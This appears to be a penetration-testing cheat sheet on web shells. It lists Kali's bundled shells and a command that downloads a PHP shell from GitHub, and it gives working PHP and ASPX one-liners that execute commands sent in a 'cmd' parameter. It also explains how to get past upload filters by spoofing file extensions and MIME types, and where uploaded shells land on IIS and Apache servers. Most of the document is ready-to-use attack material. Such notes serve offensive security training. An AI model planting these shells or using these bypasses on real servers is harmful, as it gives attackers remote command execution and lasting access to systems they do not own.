# Web Shells (Persistence & Access)
**Concept:** A script uploaded to a web server that allows remote command execution. 
**Key Insight:** Web shells run with the permissions of the web server service account (e.g., `www-data` on Linux, `IIS AppPool\DefaultAppPool` on Windows).
## 1. Common Web Shells (Kali Linux)
**Location:** `/usr/share/webshells/` **Note:** Kali comes with a library of shells for PHP, ASP, ASPX, JSP, and Perl.
### Laudanum (General Purpose)
**Location:** `/usr/share/webshells/laudanum/` **Best For:** When you need a ready-made, stable shell. **Deployment:**
1. Copy the shell (e.g., `aspx/shell.aspx`) to your working directory.
2. **Edit the file:** You **MUST** add your IP to the "allowed IPs" list (usually around line 59) or comment out the check entirely, otherwise you will get a 403 Forbidden.
3. Upload to the target.
### Antak (ASPX / Windows)
**Location:** `/usr/share/nishang/Antak-WebShell/antak.aspx` **Best For:** IIS Servers. It acts like a PowerShell console inside a web page. **Deployment:**
1. Open the file in a text editor.
2. Set the `Username` and `Password` variables at the top of the file.
3. Upload to the IIS server.
4. Navigate to `http://target/antak.aspx`, login, and run PowerShell commands.
### WhiteWinterWolf (PHP / Linux)
**Location:** [GitHub](https://github.com/WhiteWinterWolf/wwwolf-php-webshell) **Best For:** Apache/Nginx. It provides a clean GUI with file upload/download capabilities. 

**Deployment:**
```shell
wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php
# Upload to target and access via browser
```
## 2. Simple One-Liners (Quick Access)
**Context:** Sometimes a full 10KB web shell is too big or gets blocked. Use a one-liner.
### PHP
```php
<?php system($_GET['cmd']); ?>
```
### ASPX
```js
<% Response.Write(new System.Diagnostics.Process().StartInfo.FileName="cmd.exe", Arguments="/c "+Request.Item["cmd"], RedirectStandardOutput=true, UseShellExecute=false, CreateNoWindow=true).StandardOutput.ReadToEnd(); %>
```
## 3. Bypassing Upload Restrictions
**Scenario:** The server blocks your `.php` or `.aspx` file. **Technique:** Content-Type Spoofing.
**Method:**
1. **Rename:** If the server checks extensions, try `shell.php.jpg` or `shell.pHp` (Case bypass).
2. **Intercept:** Use Burp Suite Proxy to catch the upload POST request.
3. **Spoof MIME:** Locate the line `Content-Type: application/x-php` or `application/octet-stream`.
4. **Modify:** Change it to a "safe" image type:
    - `Content-Type: image/jpeg`
    - `Content-Type: image/gif`
    - `Content-Type: image/png`
5. **Forward:** Send the request. If the server only validates the MIME type (magic bytes), it will accept the file but execute it as code.
## 4. Common Paths (Where did it go?)
**Goal:** After uploading, you need to find the file to trigger it.
**Windows (IIS):**
- **Root:** `C:\inetpub\wwwroot`
- **Uploads:** `/files/`, `/uploads/`, `/images/vendor/`
- **URL:** `http://target.com/files/shell.aspx`

**Linux (Apache/Nginx):**
- **Root:** `/var/www/html/`
- **Uploads:** `/var/www/html/uploads/`, `/images/`
- **URL:** `http://target.com/uploads/shell.php`